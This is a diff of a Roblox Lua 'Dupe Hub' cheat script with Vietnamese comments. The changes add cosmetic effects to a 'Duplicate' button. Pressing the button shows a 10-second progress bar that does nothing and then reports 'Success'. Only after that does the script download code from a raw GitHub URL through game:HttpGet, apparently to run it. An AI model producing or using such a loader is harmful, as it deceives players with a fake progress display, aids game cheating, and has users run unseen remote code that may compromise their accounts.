@@ -1,4 +1,4 @@
--- Dupe Hub v2.1 (PlayerGui): gọn chiều ngang, nút vừa khung
+-- Dupe Hub v2.2 (PlayerGui): hiệu ứng song song + viền sáng khi xong
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -63,7 +63,7 @@ gui.IgnoreGuiInset = true
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 gui.Parent = PG
 
--- Loading box (8s)
+-- Loading 8s
 local bg = Instance.new("Frame", gui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -143,12 +143,12 @@ body.BackgroundTransparency = 1
 body.Size = UDim2.new(1, -36, 1, -64)
 body.Position = UDim2.new(0, 18, 0, 56)
 
--- 🧠 Duplicate button with built-in progress bar
+-- 🧠 Nút chính
 local btnDup2 = pill(body, "🧠 Duplicate")
 btnDup2.Position = UDim2.new(0, 0, 0, 0)
 pillColor(btnDup2, 114, 106, 240)
 
--- ⚡ Thanh tiến trình nằm trong nút
+-- ⚡ Thanh tiến trình trong nút
 local fillInside = Instance.new("Frame", btnDup2)
 fillInside.Size = UDim2.new(0, 0, 1, 0)
 fillInside.BackgroundColor3 = Color3.fromRGB(70, 200, 90)
@@ -157,7 +157,17 @@ fillInside.BorderSizePixel = 0
 fillInside.ZIndex = 0
 Instance.new("UICorner", fillInside).CornerRadius = UDim.new(0, 12)
 
--- ⚡ Nhãn phần trăm hiển thị trong nút
+-- 🌈 Luồng sáng bên trái chạy song song tiến trình
+local glowTrail = Instance.new("Frame", btnDup2)
+glowTrail.Size = UDim2.new(0, 10, 1, 0)
+glowTrail.Position = UDim2.new(0, -10, 0, 0)
+glowTrail.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+glowTrail.BackgroundTransparency = 0.6
+glowTrail.BorderSizePixel = 0
+glowTrail.ZIndex = 1
+Instance.new("UICorner", glowTrail).CornerRadius = UDim.new(1, 0)
+
+-- 🧩 Nhãn phần trăm
 local percentLabel = Instance.new("TextLabel", btnDup2)
 percentLabel.BackgroundTransparency = 1
 percentLabel.Size = UDim2.new(1, 0, 1, 0)
@@ -168,7 +178,7 @@ percentLabel.TextTransparency = 1
 percentLabel.Text = "0%"
 percentLabel.ZIndex = 2
 
--- ⚡ Hiệu ứng đổi màu tím → xanh mượt dần
+-- 🌈 Hiệu ứng tím → xanh mượt
 local function tweenColor(btn, duration)
 	local startColor = Color3.fromRGB(114, 106, 240)
 	local endColor = Color3.fromRGB(70, 200, 90)
@@ -182,7 +192,19 @@ local function tweenColor(btn, duration)
 	btn.BackgroundColor3 = endColor
 end
 
--- ⚡ Khi bấm nút
+-- 💫 Viền sáng mờ dần
+local function pulseGlow(btn)
+	local s = btn:FindFirstChildOfClass("UIStroke")
+	if not s then return end
+	for i = 1, 3 do
+		TweenService:Create(s, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {Transparency = 0.1, Color = Color3.fromRGB(100, 255, 150)}):Play()
+		task.wait(0.4)
+		TweenService:Create(s, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {Transparency = 0.75, Color = Color3.fromRGB(255, 255, 255)}):Play()
+		task.wait(0.4)
+	end
+end
+
+-- 🎯 Khi bấm nút
 btnDup2.MouseButton1Click:Connect(function()
 	pcall(function()
 		btnDup2.AutoButtonColor = false
@@ -190,24 +212,22 @@ btnDup2.MouseButton1Click:Connect(function()
 		percentLabel.TextTransparency = 0
 		fillInside.Size = UDim2.new(0, 0, 1, 0)
 		fillInside.BackgroundTransparency = 0.4
+		glowTrail.Position = UDim2.new(0, -10, 0, 0)
 		pillColor(btnDup2, 114, 106, 240)
 
-		-- Thanh tiến trình 10 giây
 		task.spawn(function()
 			for i = 1, 100 do
 				percentLabel.Text = i .. "%"
 				fillInside.Size = UDim2.new(i / 100, 0, 1, 0)
+				glowTrail.Position = UDim2.new(i / 100, -10, 0, 0)
 				task.wait(0.1)
 			end
 
-			-- Khi hoàn tất
+			-- ✅ Khi hoàn tất
 			percentLabel.Text = "Success"
 			fillInside.BackgroundTransparency = 1
-
-			-- Chuyển tím sang xanh mượt
-			task.spawn(function()
-				tweenColor(btnDup2, 2)
-			end)
+			task.spawn(function() tweenColor(btnDup2, 2) end)
+			task.spawn(function() pulseGlow(btnDup2) end)
 
 			task.wait(1)
 			btnDup2.TextTransparency = 0
@@ -215,7 +235,7 @@ btnDup2.MouseButton1Click:Connect(function()
 			btnDup2.Text = "🧠 Duplicate"
 			btnDup2.AutoButtonColor = true
 
-			-- Gọi script gốc sau khi hoàn tất
+			-- Tải script gốc
 			local u = "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
 			local s
 			pcall(function() s = game:HttpGet(u) end)
@@ -244,7 +264,7 @@ panel.MouseButton1Click:Connect(function()
 	frame.Visible = visible
 end)
 
--- Delay hiển thị
+-- Delay show
 task.delay(8, function()
 	bg:Destroy()
 	box:Destroy()
